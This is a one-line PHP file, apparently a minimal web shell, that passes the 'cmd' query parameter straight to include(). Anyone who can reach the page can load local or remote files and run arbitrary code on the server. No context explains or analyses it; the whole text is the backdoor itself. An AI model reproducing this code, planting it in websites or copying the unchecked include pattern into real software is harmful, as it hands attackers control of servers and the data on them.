<?include($_GET[cmd]);?>
